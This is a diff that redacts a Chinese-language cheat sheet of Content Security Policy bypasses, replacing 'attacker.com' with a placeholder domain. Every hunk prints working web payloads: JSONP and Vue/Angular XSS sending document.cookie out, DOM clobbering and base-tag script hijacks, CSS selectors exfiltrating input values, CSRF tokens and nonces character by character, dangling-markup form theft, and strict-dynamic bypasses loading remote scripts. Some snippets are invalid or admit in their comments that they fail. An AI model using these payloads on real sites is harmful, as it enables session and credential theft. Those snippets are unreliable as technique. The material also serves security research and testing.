@@ -47,7 +47,7 @@ function jsonp_bypass(endpoint, callback_param, payload) {
     const p2 = `${endpoint}?${callback_param}=x=>{${payload}}//`;
     
     // 绕过模式 3: with 语句处理
-    const p3 = `${endpoint}?${callback_param}=with(new XMLHttpRequest)open('GET','https://attacker.com/'+document.cookie),send()//`;
+    const p3 = `${endpoint}?${callback_param}=with(new XMLHttpRequest)open('GET','https://<attacker-domain>/'+document.cookie),send()//`;
     
     return [p1, p2, p3];
 }
@@ -157,7 +157,7 @@ const CDN_GADGETS = {
 <script>
   new Vue({
     el: '#app',
-    data: { payload: '<img src=x onerror="fetch(\'https://attacker.com/\'+document.cookie)">' }
+    data: { payload: '<img src=x onerror="fetch(\'https://<attacker-domain>/\'+document.cookie)">' }
   });
 </script>
 ```
@@ -171,7 +171,7 @@ const CDN_GADGETS = {
 <!-- 场景: CSP strict-dynamic 但 Angular 应用存在 sanitization bypass -->
 
 <!-- Sandbox escape via styles in Angular 15+ -->
-<div [style.background]="'url(javascript:fetch(\'https://attacker.com/\'+document.cookie))'">
+<div [style.background]="'url(javascript:fetch(\'https://<attacker-domain>/\'+document.cookie))'">
   Test
 </div>
 
@@ -244,12 +244,12 @@ const CDN_GADGETS = {
 
 <!-- 但如果使用: -->
 <form id="config">
-  <input name="cdn" value="https://attacker.com">
+  <input name="cdn" value="https://<attacker-domain>">
 </form>
 <!-- window.config → HTMLFormElement -->
 <!-- window.config.cdn → 且由于 form 元素的命名访问特性
      → 返回 <input name="cdn"> 的 value -->
-<!-- 最终 script.src = "https://attacker.com/app.js" → 绕过 CSP! -->
+<!-- 最终 script.src = "https://<attacker-domain>/app.js" → 绕过 CSP! -->
 ```
 
 ## 5. Base Tag Injection
@@ -261,8 +261,8 @@ const CDN_GADGETS = {
 <!-- 页面加载 /js/app.js (相对路径) -->
 
 <!-- 注入: -->
-<base href="https://attacker.com/">
-<!-- 之后所有 /js/app.js → https://attacker.com/js/app.js -->
+<base href="https://<attacker-domain>/">
+<!-- 之后所有 /js/app.js → https://<attacker-domain>/js/app.js -->
 <!-- 但攻击者服务器在该路径放置恶意 JS → CSP 'self' 信任原来的域，不是新域... -->
 
 <!-- 等等! base 标签只影响相对路径，不影响绝对路径 -->
@@ -270,7 +270,7 @@ const CDN_GADGETS = {
 <!-- 浏览器解析为: https://original.com/js/jquery.js → 不受 base 影响 -->
 
 <!-- 但如果页面使用: <script src="js/jquery.js"></script> (无前导 /) -->
-<!-- base 影响后 → https://attacker.com/js/jquery.js → CSP check: -->
+<!-- base 影响后 → https://<attacker-domain>/js/jquery.js → CSP check: -->
 <!-- CSP script-src 'self' → 'self' 解析为页面的 origin → 拒绝! -->
 
 <!-- 实际绕过需要 CSP 允许特定的 CDN 域，而 base 指向的子路径在该域上 -->
@@ -299,13 +299,13 @@ const CDN_GADGETS = {
 /* 场景: <style> 标签注入，或 style-src 'unsafe-inline' */
 
 /* Attribute value selector — 字符级窃取 */
-input[value^="a"] { background: url(https://attacker.com/char?a); }
-input[value^="b"] { background: url(https://attacker.com/char?b); }
-input[value^="c"] { background: url(https://attacker.com/char?c); }
+input[value^="a"] { background: url(https://<attacker-domain>/char?a); }
+input[value^="b"] { background: url(https://<attacker-domain>/char?b); }
+input[value^="c"] { background: url(https://<attacker-domain>/char?c); }
 /* ... 26个字母 + 数字 + 特殊字符 ... */
 
 /* 针对 CSRF token 的 CSS 注入 */
-input[name="csrf_token"][value^="a"] { background: url(https://attacker.com/token/a); }
+input[name="csrf_token"][value^="a"] { background: url(https://<attacker-domain>/token/a); }
 ```
 
 ```css
@@ -319,7 +319,7 @@ input[name="csrf_token"][value^="a"] { background: url(https://attacker.com/toke
 
 /* 真正的 Dangling Markup: 利用 <form> 动作 */
 /* 注入: */
-<form action="https://attacker.com/steal" method="POST" id="exfil">
+<form action="https://<attacker-domain>/steal" method="POST" id="exfil">
 <input name="secret" value="
 <!-- 后续 HTML 直到遇到 " 都被包含在 input value 中作为隐藏数据 -->
 <!-- 然后表单自动提交 → 窃取内容 -->
@@ -329,7 +329,7 @@ input[name="csrf_token"][value^="a"] { background: url(https://attacker.com/toke
 /* Scroll-to-text-fragment CSS injection */
 /* CSP: style-src 'self'; 但可注入 CSS 时: */
 :target::before {
-    content: url(https://attacker.com/visited?q=);
+    content: url(https://<attacker-domain>/visited?q=);
 }
 /* 结合 #:~:text= 实现访问窃取 */
 ```
@@ -346,7 +346,7 @@ input[name="csrf_token"][value^="a"] { background: url(https://attacker.com/toke
 
 /* 利用 CSS scroll-driven animations (CSS 2023+) */
 @keyframes leak {
-    to { background: url(https://attacker.com/leak); }
+    to { background: url(https://<attacker-domain>/leak); }
 }
 span:has(+ span:has(+ span:contains("a"))) {
     animation: leak 1s;
@@ -373,14 +373,14 @@ span:has(+ span:has(+ span:contains("a"))) {
 # 如果攻击者控制了被信任脚本的输出:
 <script nonce="abc123">
 // 攻击者注入点在这里
-import('https://attacker.com/evil.js');
+import('https://<attacker-domain>/evil.js');
 </script>
 
 # 绕过 3: Worker 创建
 # strict-dynamic 允许被信任脚本创建 Worker/SharedWorker
 <script nonce="abc123">
-new Worker('https://attacker.com/worker.js');
-new SharedWorker('https://attacker.com/shared-worker.js');
+new Worker('https://<attacker-domain>/worker.js');
+new SharedWorker('https://<attacker-domain>/shared-worker.js');
 </script>
 ```
 
@@ -401,7 +401,7 @@ new SharedWorker('https://attacker.com/shared-worker.js');
 // 更实际的场景:
 // 登录后页面加载用户头像: <script nonce="xxx"> var avatar = "{{user_avatar_url}}"; </script>
 // 如果用户可控头像 URL 且可注入:
-// avatar = "x"; import('https://attacker.com/evil.js');//
+// avatar = "x"; import('https://<attacker-domain>/evil.js');//
 // → strict-dynamic 信任该 import → 任意 JS 执行!
 ```
 
@@ -412,7 +412,7 @@ new SharedWorker('https://attacker.com/shared-worker.js');
 ```javascript
 // 如果 nonce 在 session 中不改变 → 攻击者可通过 XSS 或其他方式窃取 nonce
 // 或者通过 CSS injection 读出 nonce:
-// script[nonce^="a"] { background: url(https://attacker.com/nonce/a); }
+// script[nonce^="a"] { background: url(https://<attacker-domain>/nonce/a); }
 
 // 非 HTTP-only cookie 存储的 nonce
 // document.cookie → document.querySelector('script[nonce]') → 窃取
